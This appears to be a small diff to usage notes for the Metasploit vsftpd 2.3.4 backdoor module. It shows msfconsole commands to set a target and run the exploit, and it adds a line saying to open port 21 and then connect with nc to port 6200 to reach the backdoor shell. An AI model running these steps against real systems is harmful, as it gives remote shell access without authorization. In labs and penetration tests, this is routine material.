@@ -37,4 +37,5 @@ msf exploit(vsftpd_234_backdoor) > set TARGET < target-id >
 msf exploit(vsftpd_234_backdoor) > show options
     ...show and set options...
 msf exploit(vsftpd_234_backdoor) > exploit
+open port 21 then nc on 6200
 
